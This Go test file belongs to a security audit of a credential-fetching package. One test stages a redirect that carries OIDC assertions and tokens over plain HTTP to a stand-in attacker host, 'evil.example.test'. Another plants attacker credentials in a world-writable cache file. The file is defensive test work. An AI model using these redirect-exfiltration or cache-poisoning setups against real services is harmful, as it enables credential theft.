// SPDX-License-Identifier: BSD-3-Clause

package credproc

// Security audit 2026-11-21 (secaudit5). These tests assert the SAFE behaviour
// and are expected to FAIL on the audited commit.

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"
)

const evilHost = "evil.example.test"

// A redirect from the https token endpoint or the https STS endpoint is
// followed, body included (307), to a plain-http host that httpsOrLoopback
// itself refuses.
func TestSecaudit5RedirectCarriesAssertionAndTokenInTheClear(t *testing.T) {
	if err := httpsOrLoopback("http://" + evilHost + "/"); err == nil {
		t.Fatal("control: the plain-http host should be refused when named directly")
	}
	for _, which := range []string{"token", "sts"} {
		t.Run(which, func(t *testing.T) {
			var mu sync.Mutex
			leaked := map[string]string{}
			evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				_ = r.ParseForm()
				mu.Lock()
				for _, k := range []string{"client_assertion", "WebIdentityToken"} {
					if v := r.PostForm.Get(k); v != "" {
						leaked[k] = v
					}
				}
				mu.Unlock()
				http.Error(w, "no", http.StatusForbidden)
			}))
			defer evil.Close()

			mux := http.NewServeMux()
			srv := httptest.NewTLSServer(mux)
			defer srv.Close()
			mux.HandleFunc("/.well-known/openid-configuration", func(w http.ResponseWriter, r *http.Request) {
				fmt.Fprintf(w, `{"issuer":%q,"token_endpoint":%q}`, srv.URL, srv.URL+"/token")
			})
			mux.HandleFunc("/token", func(w http.ResponseWriter, r *http.Request) {
				if which == "token" {
					http.Redirect(w, r, "http://"+evilHost+"/", http.StatusTemporaryRedirect)
					return
				}
				fmt.Fprint(w, `{"access_token":"bearer-secret"}`)
			})
			mux.HandleFunc("/s3/", func(w http.ResponseWriter, r *http.Request) {
				http.Redirect(w, r, "http://"+evilHost+"/", http.StatusTemporaryRedirect)
			})

			hc := srv.Client()
			tr := hc.Transport.(*http.Transport).Clone()
			evilAddr := evil.Listener.Addr().String()
			tr.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
				if addr == evilHost+":80" {
					addr = evilAddr
				}
				var d net.Dialer
				return d.DialContext(ctx, network, addr)
			}
			hc = &http.Client{Transport: tr, Timeout: 20 * time.Second}

			key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
			_, _ = Credentials(context.Background(), &Config{
				Issuer: srv.URL, Client: "winpc-17", Key: key, STS: srv.URL + "/s3", HTTP: hc,
			})
			mu.Lock()
			defer mu.Unlock()
			for k, v := range leaked {
				t.Errorf("%s reached http://%s in the clear after a redirect (%d bytes)", k, evilHost, len(v))
			}
		})
	}
}

type noNetwork struct{}

func (noNetwork) RoundTrip(*http.Request) (*http.Response, error) {
	return nil, errors.New("no network in this test")
}

// A cache file anybody could have written, in a directory anybody can write
// to, is returned as this machine's credentials without a single request.
func TestSecaudit5CacheFileWrittenByAnybodyIsTrusted(t *testing.T) {
	if os.PathSeparator != '/' {
		t.Skip("file modes")
	}
	dir := filepath.Join(t.TempDir(), "shared")
	if err := os.Mkdir(dir, 0o777); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o777); err != nil {
		t.Fatal(err)
	}
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	c := &Config{Issuer: "https://login.example.org", Client: "winpc-17", Key: key,
		STS: "https://s3.example.org", CacheDir: dir, HTTP: &http.Client{Transport: noNetwork{}}}
	planted := `{"Version":1,"AccessKeyId":"ATTACKER","SecretAccessKey":"attacker-secret","SessionToken":"t","Expiration":"2099-01-01T00:00:00Z"}`
	p := c.cachePath()
	if err := os.WriteFile(p, []byte(planted), 0o666); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(p, 0o666); err != nil {
		t.Fatal(err)
	}
	o, err := Credentials(context.Background(), c)
	if err == nil {
		t.Fatalf("a world-writable cache file in a world-writable directory was trusted: AccessKeyId %q (LoadKey refuses a key file of that mode)", o.AccessKeyID)
	}
}
